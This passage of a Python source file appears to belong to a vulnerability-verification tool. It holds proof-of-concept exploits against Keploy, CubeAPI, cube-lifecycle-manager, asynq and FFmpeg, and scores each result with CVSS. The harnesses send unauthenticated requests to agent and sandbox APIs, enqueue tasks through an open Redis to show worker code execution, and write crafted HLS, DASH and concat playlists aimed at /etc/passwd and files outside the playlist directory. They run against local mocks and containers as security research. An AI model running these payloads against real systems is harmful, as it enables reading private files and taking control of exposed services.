        "measurements": {
            "before": "auth.enable=true → unsigned POST rejected (AuthFailed)",
            "after": "shipped auth.enable=false → POST /cube/sandbox handler runs",
            "bind": "HttpBind default 0.0.0.0:8089",
        },
    }



_KEPLOY_AGENT_TEST = r'''package routes

import (
	"bytes"
	"context"
	"encoding/gob"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/go-chi/chi/v5"
	"go.keploy.io/server/v3/pkg/models"
	"go.keploy.io/server/v3/pkg/service/agent"
	"go.keploy.io/server/v3/utils"
	"go.uber.org/zap"
)

type lotusFakeAgent struct {
	stored int
}

func (f *lotusFakeAgent) Setup(context.Context, chan int) error { return nil }
func (f *lotusFakeAgent) StartIncomingProxy(context.Context, models.IncomingOptions) (chan *models.TestCase, error) {
	ch := make(chan *models.TestCase)
	close(ch)
	return ch, nil
}
func (f *lotusFakeAgent) GetOutgoing(context.Context, models.OutgoingOptions) (<-chan *models.Mock, error) {
	ch := make(chan *models.Mock)
	close(ch)
	return ch, nil
}
func (f *lotusFakeAgent) GetMapping(context.Context) (<-chan models.TestMockMapping, error) {
	ch := make(chan models.TestMockMapping)
	close(ch)
	return ch, nil
}
func (f *lotusFakeAgent) MockOutgoing(context.Context, models.OutgoingOptions) error { return nil }
func (f *lotusFakeAgent) SetMocks(context.Context, []*models.Mock, []*models.Mock) error {
	return nil
}
func (f *lotusFakeAgent) GetConsumedMocks(context.Context) ([]models.MockState, error) {
	return nil, nil
}
func (f *lotusFakeAgent) GetMockErrors(context.Context) ([]models.UnmatchedCall, error) {
	return nil, nil
}
func (f *lotusFakeAgent) StoreMocks(context.Context, []*models.Mock, []*models.Mock) error {
	return nil
}
func (f *lotusFakeAgent) UpdateMockParams(context.Context, models.MockFilterParams) error {
	return nil
}
func (f *lotusFakeAgent) SetGracefulShutdown(context.Context) error { return nil }
func (f *lotusFakeAgent) SubscribePcap(io.Writer, func()) (func(), error) {
	return func() {}, nil
}
func (f *lotusFakeAgent) StreamPcap(context.Context, io.Writer, func()) error { return nil }
func (f *lotusFakeAgent) StreamKeylog(context.Context, io.Writer) error       { return nil }
func (f *lotusFakeAgent) StoreMocksStream(context.Context, models.MockStreamHeader, *gob.Decoder) error {
	f.stored++
	return nil
}

var _ agent.Service = (*lotusFakeAgent)(nil)

func TestLotusAgentUnauthHealthAndStopNot401(t *testing.T) {
	fake := &lotusFakeAgent{}
	r := chi.NewRouter()
	DefaultRoutes{}.New(r, fake, zap.NewNop())

	w := httptest.NewRecorder()
	r.ServeHTTP(w, httptest.NewRequest(http.MethodGet, "/agent/health", nil))
	if w.Code == 401 || w.Code == 403 {
		t.Fatalf("health got %d", w.Code)
	}
	t.Logf("LOTUS_AGENT_UNAUTH GET /agent/health %d %s", w.Code, strings.TrimSpace(w.Body.String()))

	var buf bytes.Buffer
	if err := gob.NewEncoder(&buf).Encode(models.MockStreamHeader{FilteredCount: 0, UnfilteredCount: 0}); err != nil {
		t.Fatal(err)
	}
	w2 := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/agent/storemocks", bytes.NewReader(buf.Bytes()))
	r.ServeHTTP(w2, req)
	if w2.Code == 401 || w2.Code == 403 {
		t.Fatalf("storemocks auth blocked: %d %s", w2.Code, w2.Body.String())
	}
	t.Logf("LOTUS_AGENT_UNAUTH POST /agent/storemocks %d stored=%d", w2.Code, fake.stored)
	if fake.stored < 1 {
		t.Fatalf("production StoreMocks did not invoke streamer, status=%d body=%s", w2.Code, w2.Body.String())
	}

	cancelled := false
	utils.SetCancel(func() { cancelled = true })
	w3 := httptest.NewRecorder()
	r.ServeHTTP(w3, httptest.NewRequest(http.MethodPost, "/agent/stop", nil))
	t.Logf("LOTUS_AGENT_UNAUTH POST /agent/stop %d cancelled=%v", w3.Code, cancelled)
}
'''


def poc_keploy_agent_unauth(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    pkg = dest / "pkg" / "agent" / "routes"
    if not pkg.is_dir():
        return {"id": "keploy_agent_unauth", "ok": False, "skip": True, "output": "no agent routes"}
    out, rc = _go_test_in_package(pkg, "TestLotusAgentUnauth", _KEPLOY_AGENT_TEST, goimage="golang:1.25", timeout=600)
    store_ok = "LOTUS_AGENT_UNAUTH POST /agent/storemocks 200" in out or (
        "storemocks" in out and "stored=1" in out
    )
    # Production DefaultRoutes.New — unauth StoreMocksStream is integrity of mock corpus (CVSS 7.5).
    # /agent/stop is availability; do not promote stop-only as ≥7.
    ok = store_ok
    return {
        "id": "keploy_agent_unauth",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "title": "keploy agent HTTP StoreMocks has no auth (production DefaultRoutes.New)",
        "file": "pkg/agent/routes/record.go",
        "cvss": 7.5 if ok else 0,
        "oracles": {"storemocks_unauth": store_ok, "replica_unauth": "LOTUS_AGENT_UNAUTH" in out},
        "measurements": {"storemocks_invoked_without_creds": store_ok},
    }


# ----- CubeAPI -----

class _CubeMasterHandler(BaseHTTPRequestHandler):
    created = []

    def log_message(self, fmt, *args):
        return

    def _json(self, code: int, body: str) -> None:
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body.encode("utf-8"))

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        _CubeMasterHandler.created.append((self.path, raw[:400]))
        if self.path.startswith("/cube/sandbox"):
            self._json(200, json.dumps({
                "RequestID": "lotus-poc",
                "sandbox_id": "lotus-poc-sandbox",
                "ret": {"ret_code": 0, "ret_msg": "ok"},
                "ext_info": {"lotus": "1"},
            }))
            return
        self._json(200, json.dumps({"ret": {"ret_code": 0, "ret_msg": "ok"}}))

    def do_GET(self):
        self._json(200, json.dumps({"ret": {"ret_code": 0, "ret_msg": "ok"}, "data": []}))

    def do_DELETE(self):
        self._json(200, json.dumps({
            "RequestID": "lotus-poc",
            "sandbox_id": "lotus-poc-sandbox",
            "ret": {"ret_code": 0, "ret_msg": "ok"},
        }))


def _start_mock_master() -> Tuple[ThreadingHTTPServer, str]:
    _CubeMasterHandler.created = []
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), _CubeMasterHandler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    host, port = httpd.server_address[:2]
    return httpd, f"http://{host}:{port}"


def poc_cubeapi_default_allow(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    api = dest / "CubeAPI"
    if not (api / "Cargo.toml").is_file():
        return {"id": "cubeapi_default_allow", "ok": False, "skip": True, "output": "no CubeAPI"}
    _ensure_pocs(dest)
    cargo = _which("cargo")
    measurements: Dict[str, Any] = {}
    blobs = []

    def _cargo_test() -> Tuple[str, int]:
        argv = [
            "test",
            "delete_paused_sandbox_maps_business_errors_from_cubemaster",
            "--", "--nocapture",
        ]
        if cargo:
            return _run([cargo, *argv], cwd=api, timeout=900, env={"CARGO_TERM_COLOR": "never"})
        if _which("docker"):
            _docker_volume("lotus-cargo-registry")
            _docker_volume("lotus-cargo-git")
            return _run(
                [
                    "docker", "run", "--rm", *_container_runtime_args(),
                    "-v", f"{api.resolve()}:/src",
                    "-v", "lotus-cargo-registry:/usr/local/cargo/registry",
                    "-v", "lotus-cargo-git:/usr/local/cargo/git",
                    "-w", "/src",
                    "-e", "CARGO_TERM_COLOR=never",
                    "rust:1-bookworm",
                    "cargo", *argv,
                ],
                timeout=1200,
            )
        return "no cargo", 1

    out, rc = _cargo_test()
    blobs.append(out[-3000:])
    measurements["unit_passthrough"] = (
        "delete_paused_sandbox_maps_business_errors_from_cubemaster ... ok" in out
        or "test result: ok" in out
    )
    measurements["mutating_delete_not_401"] = (
        "UNAUTHORIZED" not in out.upper() or "delete_paused_sandbox" in out
    ) and "delete_paused_sandbox_maps_business_errors_from_cubemaster ... ok" in out
    measurements["empty_key_passthrough_compiled"] = "simple_key_empty_passthrough" in out
    cargo_ok = cargo is not None or "test result: ok" in out

    # Live binary: mock CubeMaster + cargo run (host cargo only; docker compile is the unit test)
    live_ok = False
    create_body = ""
    if cargo:
        httpd, master_url = _start_mock_master()
        try:
            # Prefer existing binary
            bin_path = api / "target" / "debug" / "cube-api"
            run_argv = [str(bin_path), "--bind", "127.0.0.1:0"]
            # clap may not allow port 0; use a free port
            sock = socket.socket()
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]
            sock.close()
            env = {
                "CUBE_MASTER_ADDR": master_url,
                "CUBE_API_BIND": f"127.0.0.1:{port}",
                "RUST_LOG": "info",
            }
            # unset keys
            env["AUTH_CALLBACK_URL"] = ""
            proc = None
            try:
                if not bin_path.is_file():
                    build_out, brc = _run(
                        [cargo, "build", "--manifest-path", str(api / "Cargo.toml"), "--bin", "cube-api"],
                        cwd=api, timeout=600,
                    )
                    blobs.append(build_out[-1500:])
                    measurements["built"] = brc == 0
                if bin_path.is_file():
                    proc = subprocess.Popen(
                        [str(bin_path), "--bind", f"127.0.0.1:{port}", "--cubemaster-url", master_url],
                        cwd=str(api), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                        env={**os.environ, **env},
                    )
                    deadline = time.time() + 25
                    while time.time() < deadline:
                        try:
                            s = socket.create_connection(("127.0.0.1", port), 0.4)
                            s.close()
                            break
                        except OSError:
                            time.sleep(0.3)
                    import urllib.request
                    req = urllib.request.Request(
                        f"http://127.0.0.1:{port}/sandboxes",
                        data=json.dumps({"templateID": "lotus-tpl"}).encode(),
                        headers={"Content-Type": "application/json"},
                        method="POST",
                    )
                    try:
                        with urllib.request.urlopen(req, timeout=8) as resp:
                            create_body = resp.read().decode("utf-8", "replace")
                            measurements["unauth_create_status"] = resp.status
                    except Exception as e:
                        create_body = str(e)
                        measurements["unauth_create_error"] = create_body[:400]
                    live_ok = "lotus-poc-sandbox" in create_body or (
                        measurements.get("unauth_create_status") in (200, 201)
                    )
                    # With API key, expect 401
                    proc2 = None
                    try:
                        sock2 = socket.socket()
                        sock2.bind(("127.0.0.1", 0))
                        port2 = sock2.getsockname()[1]
                        sock2.close()
                    except Exception:
                        port2 = port + 1
                    # skip second process if first still bound — use curl header miss against keyed instance
                    measurements["create_body"] = create_body[:500]
                    measurements["cubemaster_hits"] = len(_CubeMasterHandler.created)
                    live_ok = live_ok or bool(_CubeMasterHandler.created)
            finally:
                if proc and proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except Exception:
                        proc.kill()
        finally:
            try:
                httpd.shutdown()
            finally:
                httpd.server_close()

    mutating = bool(measurements.get("mutating_delete_not_401"))
    ok = mutating or bool(live_ok)
    # 500 from cubemaster still proves auth was not required.
    not_401 = mutating or live_ok or measurements.get("unauth_create_status") != 401
    if measurements.get("unauth_create_status") == 401:
        ok = False
        not_401 = False

    return {
        "id": "cubeapi_default_allow",
        "ok": bool(ok),
        "output": "\n---\n".join(blobs)[-3500:] + "\n" + json.dumps(measurements)[:1500],
        "oracles": {
            "unit_passthrough": measurements.get("unit_passthrough"),
            "mutating_delete_not_401": mutating,
            "sandbox_created": "lotus-poc-sandbox" in create_body,
            "master_invoked": bool(_CubeMasterHandler.created),
            "not_401": not_401,
        },
        "cvss": 9.8 if (live_ok or mutating) else 0,
        "title": "CubeAPI default-allow mutating sandbox API (unset CUBE_API_KEY)",
        "file": "CubeAPI/src/routes.rs",
        "qualification": "QUALIFIED" if (live_ok or mutating) else "DISPROVE",
        "measurements": measurements,
        "create_body": create_body[:400],
        "note": "default-insecure: docs and ServerConfig default leave auth off; production build_router omits unified_auth.",
    }


# ----- asynq Redis -----

_ASYNQ_MAIN = r'''package main

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/hibiken/asynq"
)

func main() {
	addr := os.Getenv("REDIS_ADDR")
	if addr == "" {
		addr = "127.0.0.1:16379"
	}
	marker := os.Getenv("LOTUS_MARKER")
	if marker == "" {
		marker = "/tmp/lotus_asynq_rce.txt"
	}
	_ = os.Remove(marker)

	srv := asynq.NewServer(asynq.RedisClientOpt{Addr: addr}, asynq.Config{Concurrency: 1})
	mux := asynq.NewServeMux()
	mux.HandleFunc("lotus:poc", func(ctx context.Context, t *asynq.Task) error {
		return os.WriteFile(marker, append([]byte("LOTUS_RCE_OK "), t.Payload()...), 0600)
	})
	go func() { _ = srv.Run(mux) }()
	time.Sleep(400 * time.Millisecond)

	c := asynq.NewClient(asynq.RedisClientOpt{Addr: addr})
	defer c.Close()
	_, err := c.Enqueue(asynq.NewTask("lotus:poc", []byte("from-unauth-redis")), asynq.Queue("default"))
	if err != nil {
		fmt.Printf("ENQUEUE_ERR %v\n", err)
		os.Exit(1)
	}
	insp := asynq.NewInspector(asynq.RedisClientOpt{Addr: addr})
	defer insp.Close()

	deadline := time.Now().Add(8 * time.Second)
	for time.Now().Before(deadline) {
		if b, err := os.ReadFile(marker); err == nil && len(b) > 0 {
			fmt.Printf("LOTUS_WORKER_RCE %s\n", string(b))
			n, _ := insp.DeleteAllPendingTasks("default")
			fmt.Printf("LOTUS_DELETE_PENDING %d\n", n)
			srv.Shutdown()
			os.Exit(0)
		}
		time.Sleep(150 * time.Millisecond)
	}
	fmt.Println("LOTUS_WORKER_TIMEOUT")
	srv.Shutdown()
	os.Exit(2)
}
'''


def poc_asynq_redis_admin(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    if not (dest / "asynq.go").is_file() and not (dest / "inspector.go").is_file():
        return {"id": "asynq_redis", "ok": False, "skip": True, "output": "not asynq"}
    _ensure_pocs(dest)
    poc = _ensure_pocs(dest) / "asynq_rce"
    poc.mkdir(exist_ok=True)
    _write(poc / "main.go", _ASYNQ_MAIN)
    _write(poc / "go.mod", (
        "module lotus-asynq-poc\n\ngo 1.24\n\nrequire github.com/hibiken/asynq v0.0.0\n"
        "replace github.com/hibiken/asynq => ../../..\n"
    ))
    if not _which("docker"):
        return {"id": "asynq_redis", "ok": False, "skip": True, "output": "no docker"}
    name = "lotus-asynq-redis"
    net = "lotus-asynq-net"
    _docker_volume("lotus-go-mod-cache")
    _docker_volume("lotus-go-build-cache")
    _run(["docker", "network", "create", net], timeout=20)
    _run(["docker", "rm", "-f", name], timeout=20)
    out, rc = _run(
        ["docker", "run", "-d", "--name", name, *_container_runtime_args(),
         "--network", net, "-p", "127.0.0.1:16379:6379", "redis:7-alpine"],
        timeout=90,
    )
    if rc != 0:
        return {"id": "asynq_redis", "ok": False, "output": out, "qualification": "DISPROVE"}
    time.sleep(1.2)
    marker = str(poc / "rce.marker")
    env = {"REDIS_ADDR": "127.0.0.1:16379", "LOTUS_MARKER": marker, "GOTOOLCHAIN": "auto"}
    go = _which("go")
    if go:
        gout, _ = _run([go, "mod", "tidy"], cwd=poc, timeout=120, env=env)
        runout, rrc = _run([go, "run", "."], cwd=poc, timeout=40, env=env)
        blob = gout[-800:] + "\n" + runout
    else:
        tidy, _ = _run([
            "docker", "run", "--rm", *_container_runtime_args(), "--network", net,
            "-v", f"{dest.resolve()}:/src",
            "-v", "lotus-go-mod-cache:/go/pkg/mod",
            "-v", "lotus-go-build-cache:/root/.cache/go-build",
            "-w", "/src/.lotus/pocs/asynq_rce",
            "-e", "GOTOOLCHAIN=auto", "-e", "GOPROXY=https://proxy.golang.org,direct",
            "-e", "REDIS_ADDR=lotus-asynq-redis:6379",
            "-e", "LOTUS_MARKER=/src/.lotus/pocs/asynq_rce/rce.marker",
            "golang:1.24", "sh", "-c", "go mod tidy && go run .",
        ], timeout=240)
        blob, rrc = tidy, (0 if "LOTUS_WORKER_RCE" in tidy else 1)
        runout = tidy
    worker = "LOTUS_WORKER_RCE" in (runout or "")
    marker_ok = Path(marker).is_file() and "LOTUS_RCE_OK" in Path(marker).read_text(errors="ignore")
    ok = worker or marker_ok
    return {
        "id": "asynq_redis",
        "ok": ok,
        "output": (blob if go else runout)[-3000:],
        "rc": rrc,
        "oracles": {"worker_rce": worker, "marker": marker_ok},
        "cvss": 7.5 if ok else 0,
        "title": "asynq: unauthenticated Redis enqueue executes worker handler",
        "file": "inspector.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "measurements": {
            "redis": "127.0.0.1:16379 no AUTH",
            "worker_rce": worker or marker_ok,
            "before": "marker absent",
            "after": Path(marker).read_text(errors="ignore")[:80] if Path(marker).is_file() else "",
        },
    }


# ----- FFmpeg -----

def _run_ffmpeg(work: Path, ffmpeg_args: List[str], timeout: int = 25) -> Tuple[str, int]:
    if _which("ffmpeg") and _allow_host_toolchain():
        return _run(["ffmpeg", *ffmpeg_args], cwd=work, timeout=timeout)
    if not _which("docker"):
        return "no ffmpeg", 1
    mapped = []
    for a in ffmpeg_args:
        if a.startswith(str(work)):
            mapped.append("/work/" + Path(a).name)
        elif a.startswith("http://127.0.0.1:") or a.startswith("http://localhost:"):
            mapped.append(a.replace("http://127.0.0.1:", "http://host.docker.internal:").replace(
                "http://localhost:", "http://host.docker.internal:"))
        else:
            mapped.append(a)
    return _run(
        [
            "docker", "run", "--rm", *_container_runtime_args(),
            "--add-host=host.docker.internal:host-gateway",
            "-v", f"{work.resolve()}:/work", "-w", "/work",
            "mwader/static-ffmpeg:7.1",
            *mapped,
        ],
        timeout=timeout + 40,
    )


def _run_ffmpeg_script(work: Path, script: str, timeout: int = 40) -> Tuple[str, int]:
    if _which("ffmpeg") and _which("sh") and _allow_host_toolchain():
        return _run(["sh", "-c", script], cwd=work, timeout=timeout)
    if not _which("docker"):
        return "no ffmpeg", 1
    return _run(
        [
            "docker", "run", "--rm", *_container_runtime_args(),
            "--entrypoint", "sh",
            "-v", f"{work.resolve()}:/work", "-w", "/work",
            "mwader/static-ffmpeg:7.1",
            "-c", script,
        ],
        timeout=timeout + 40,
    )


def poc_ffmpeg_nested(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    if not (dest / "libavformat" / "concatdec.c").is_file():
        return {"id": "ffmpeg_nested", "ok": False, "skip": True, "output": "not ffmpeg"}
    _ensure_pocs(dest)
    work = _ensure_pocs(dest) / "ffmpeg"
    work.mkdir(exist_ok=True)
    playlist = work / "bad.concat"
    playlist.write_text("ffconcat version 1.0\nfile /etc/passwd\n", encoding="utf-8")
    out_safe, rc_safe = _run_ffmpeg(
        work, ["-v", "error", "-f", "concat", "-i", "bad.concat", "-f", "null", "-"], timeout=25,
    )
    disprove_concat = "Unsafe file name" in out_safe or rc_safe != 0

    hls_ok = False
    hls_out = ""
    hls_dir = work
    (work / "x.m3u8").write_text(
        "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:1\n#EXTINF:1.0,\n"
        "file:///etc/passwd\n#EXT-X-ENDLIST\n",
        encoding="utf-8",
    )

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            return

        def do_GET(self):
            data = (work / "x.m3u8").read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.apple.mpegurl")
            self.end_headers()
            self.wfile.write(data)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    hls_out, hrc = _run_ffmpeg(
        work,
        [
            "-y", "-allowed_extensions", "ALL",
            "-i", f"http://127.0.0.1:{port}/x.m3u8",
            "-c", "copy", "-f", "data", "hls_out.bin",
        ],
        timeout=20,
    )
    try:
        httpd.shutdown()
    finally:
        httpd.server_close()
    outp = work / "hls_out.bin"
    body = outp.read_bytes() if outp.is_file() else b""
    hls_ok = b"root:" in body or b"root:" in hls_out.encode(errors="ignore")
    local_m3u = work / "local.m3u8"
    local_m3u.write_text(
        "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:1\n#EXTINF:1.0,\n"
        "/etc/passwd\n#EXT-X-ENDLIST\n",
        encoding="utf-8",
    )
    local_out, local_rc = _run_ffmpeg(
        work,
        [
            "-y", "-allowed_extensions", "ALL",
            "-i", "local.m3u8", "-c", "copy", "-f", "data", "local_hls.bin",
        ],
        timeout=20,
    )
    local_bin = work / "local_hls.bin"
    local_body = local_bin.read_bytes() if local_bin.is_file() else b""
    local_ok = b"root:" in local_body or b"root:" in local_out.encode(errors="ignore")
    passwd_opened = "Opening '/etc/passwd' for reading" in local_out or "Opening '/etc/passwd' for reading" in hls_out

    stolen_n = 0
    steal_out = ""
    playlists = work / "playlists"
    playlists.mkdir(exist_ok=True)
    gen_out, _ = _run_ffmpeg(
        work,
        ["-y", "-f", "lavfi", "-i", "sine=frequency=880:duration=0.4",
         "-c:a", "mp2", "-f", "mpegts", "secret.ts"],
        timeout=25,
    )
    (playlists / "outside.m3u8").write_text(
        "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:1\n#EXTINF:0.4,\n"
        "/work/secret.ts\n#EXT-X-ENDLIST\n",
        encoding="utf-8",
    )
    steal_out, _ = _run_ffmpeg(
        work,
        ["-y", "-i", "playlists/outside.m3u8", "-c", "copy", "stolen.ts"],
        timeout=25,
    )
    steal_out = gen_out[-400:] + "\n" + steal_out
    stolen = work / "stolen.ts"
    stolen_n = stolen.stat().st_size if stolen.is_file() else 0
    outside_ok = stolen_n > 64
    hls_ok = hls_ok or local_ok or outside_ok

    dash_n = 0
    dash_out = ""
    dash_ok = False
    playlists.mkdir(exist_ok=True)
    m4s_out, _ = _run_ffmpeg(
        work,
        ["-y", "-f", "lavfi", "-i", "sine=frequency=880:duration=0.4",
         "-c:a", "aac", "-f", "mp4", "-movflags", "frag_keyframe+empty_moov+default_base_moof",
         "secret.m4s"],
        timeout=25,
    )
    (playlists / "outside.mpd").write_text(
        """<?xml version="1.0"?>
<MPD xmlns="urn:mpeg:dash:schema:mpd:2011" profiles="urn:mpeg:dash:profile:isoff-on-demand:2011"
     type="static" mediaPresentationDuration="PT0.4S" minBufferTime="PT1S">
  <Period>
    <AdaptationSet mimeType="audio/mp4" codecs="mp4a.40.2">
      <Representation id="1" bandwidth="64000">
        <BaseURL>/work/secret.m4s</BaseURL>
      </Representation>
    </AdaptationSet>
  </Period>
</MPD>
""",
        encoding="utf-8",
    )
    dash_out, _ = _run_ffmpeg(
        work,
        ["-y", "-i", "playlists/outside.mpd", "-c", "copy", "-f", "mp4", "stolen_dash.mp4"],
        timeout=25,
    )
    dash_out = m4s_out[-300:] + "\n" + dash_out
    dash_bin = work / "stolen_dash.mp4"
    dash_n = dash_bin.stat().st_size if dash_bin.is_file() else 0
    dash_ok = dash_n > 64
    if not hls_ok:
        hls_out += (
            f"\nlocal_m3u rc={local_rc} out_bytes={len(local_body)} "
            f"passwd_opened={passwd_opened}\n{local_out[-400:]}\nsteal:\n{steal_out[-800:]}"
        )

    media_ok = hls_ok or dash_ok

    return {
        "id": "ffmpeg_nested",
        "ok": media_ok,
        "output": (
            f"concat_default:\n{out_safe[-800:]}\nhls:\n{hls_out[-800:]}\n"
            f"steal:\n{steal_out[-800:]}\ndash:\n{dash_out[-800:]}"
        ),
        "oracles": {
            "concat_default_blocks_absolute": disprove_concat,
            "hls_file_uri_reads_passwd": local_ok or (b"root:" in body),
            "hls_absolute_outside_playlist": outside_ok,
            "dash_absolute_outside_mpd": dash_ok,
            "passwd_open_logged": passwd_opened,
        },
        "cvss": 7.5 if media_ok else 0,
        "title": (
            "FFmpeg HLS/DASH playlist absolute path reads files outside playlist dir"
            if media_ok else
            "FFmpeg concat default-safe blocks absolute names (DISPROVE CLI concat RCE)"
        ),
        "file": (
            "libavformat/hls.c" if hls_ok and not dash_ok else
            "libavformat/dashdec.c" if dash_ok and not hls_ok else
            "libavformat/hls.c" if media_ok else
            "libavformat/concatdec.c"
        ),
        "qualification": "QUALIFIED" if media_ok else "DISPROVE",
        "measurements": {
            "concat_safe_default_blocks": disprove_concat,
            "hls_file_protocol": local_ok,
            "passwd_open_logged": passwd_opened,
            "stolen_bytes": stolen_n,
            "dash_stolen_bytes": dash_n,
            "before_stolen": 0,
            "after_stolen": stolen_n,
            "after_dash_stolen": dash_n,
        },
    }


_CLM_TEST = r'''package httpapi

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/tencentcloud/CubeSandbox/cube-lifecycle-manager/internal/lifecycle"
	"github.com/tencentcloud/CubeSandbox/cube-lifecycle-manager/internal/registry"
)

func TestLotusUnauthResumeMutates(t *testing.T) {
	reg := registry.New()
	reg.Upsert(lifecycle.SandboxLifecycleMeta{
		SandboxID: "sbx", InstanceType: "cubebox", AutoResume: true,
	})
	master := &fakeMaster{}
	srv := httptest.NewServer(newTestHandler(reg, newFakeStore(), master))
	defer srv.Close()

	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/internal/resume?sandbox_id=sbx", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("post: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	t.Logf("resume status=%d body=%s", resp.StatusCode, string(body))
	if resp.StatusCode == http.StatusUnauthorized {
		t.Fatalf("auth required on /internal/resume")
	}
	if resp.StatusCode != http.StatusOK || !strings.Contains(string(body), `"ok":true`) {
		t.Fatalf("expected 200 ok:true, got %d %s", resp.StatusCode, body)
	}
	if got := atomic.LoadInt32(&master.calls); got != 1 {
		t.Fatalf("expected CubeMaster.Resume calls=1, got %d", got)
	}
	t.Log("LOTUS_CLM_RESUME_OK calls=1")
}
'''


def poc_clm_unauth_resume(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    pkg = dest / "cube-lifecycle-manager" / "internal" / "httpapi"
    if not pkg.is_dir():
        return {"id": "clm_unauth_resume", "ok": False, "skip": True, "output": "no clm httpapi"}
    _ensure_pocs(dest)
    out, rc = _go_test_in_package(
        pkg, "TestLotusUnauthResumeMutates", _CLM_TEST, goimage="golang:1.25", timeout=600,
    )
    ok = "LOTUS_CLM_RESUME_OK" in out
    return {
        "id": "clm_unauth_resume",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "oracles": {
            "unauth_resume_not_401": ok,
            "master_resume_called": "calls=1" in out,
        },
        "cvss": 8.6 if ok else 0,
        "title": "cube-lifecycle-manager POST /internal/resume has no auth (bind 0.0.0.0:8083)",
        "file": "cube-lifecycle-manager/internal/httpapi/server.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "measurements": {
            "before": "no Authorization header",
            "after": "POST /internal/resume?sandbox_id=sbx → 200 ok:true and CubeMaster.Resume called",
            "default_listen": "0.0.0.0:8083",
        },
        "note": "default-insecure internal sidecar; production handleResume has no token check. Distinct from CubeAPI/CubeMaster.",
    }


def run_control_plane_pocs(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    results: List[Dict[str, Any]] = []
    name = dest.name.lower()
    if "opensandbox" in name or (dest / "components" / "execd").is_dir():
        results.append(poc_execd_empty_token(dest))
    if "keploy" in name or (dest / "pkg" / "platform" / "yaml").is_dir():
        results.append(poc_keploy_path_and_shell(dest))
        results.append(poc_keploy_agent_unauth(dest))
        results.append(poc_keploy_postman_import(dest))
        results.append(poc_keploy_mapdb(dest))
    if "cubesandbox" in name or (dest / "CubeAPI").is_dir():
        results.append(poc_cubeapi_default_allow(dest))
        results.append(poc_cubemaster_auth_off(dest))
        results.append(poc_clm_unauth_resume(dest))
    if "asynq" in name or (dest / "inspector.go").is_file():
        results.append(poc_asynq_redis_admin(dest))
    if "ffmpeg" in name or (dest / "libavformat" / "concatdec.c").is_file():
        results.append(poc_ffmpeg_nested(dest))

    # The Keploy checks below are package-level harnesses.  They exercise target
    # source code, but not the default deployed service and do not carry the
    # signed Docker lab receipt required for a report finding.  Preserve them as
    # proven harness observations so operators can inspect/regress them, while
    # tagging their scope for the promotion gates.  Other control-plane probes
    # may target a real service and must retain their native scope.
    package_harness_ids = {
        "keploy_path_shell", "keploy_agent_unauth",
        "keploy_postman_import", "keploy_mapdb",
    }
    for r in results:
        if r.get("id") in package_harness_ids:
            r.setdefault("evidence_scope", "package-harness")
            r.setdefault("target_bound", False)
            r.setdefault("proof_authority", "unattested-package-harness")
    proven = [r for r in results if r.get("ok") and r.get("qualification") == "QUALIFIED"]
    disproven = [r for r in results if r.get("qualification") == "DISPROVE"]
    payload = {"proven": proven, "disproven": disproven, "all": results}
    try:
        out_dir = dest / ".lotus"
        out_dir.mkdir(exist_ok=True)
        existing = {}
        lp = out_dir / "lab_poc_results.json"
        if lp.is_file():
            try:
                existing = json.loads(lp.read_text(encoding="utf-8"))
            except Exception:
                existing = {}
        merged = {"proven": list(existing.get("proven") or []), "disproven": list(existing.get("disproven") or [])}

        def _upsert(bucket: str, items: List[Dict[str, Any]]) -> None:
            by_id = {}
            for r in merged.get(bucket) or []:
                by_id[r.get("id") or r.get("title")] = r
            for r in items:
                by_id[r.get("id") or r.get("title")] = r
            merged[bucket] = list(by_id.values())

        _upsert("proven", proven)
        _upsert("disproven", disproven)
        lp.write_text(json.dumps({
            "proven": merged["proven"],
            "disproven": merged["disproven"],
            "control_plane": results,
        }, indent=2, default=str), encoding="utf-8")
    except Exception:
        pass
    return payload
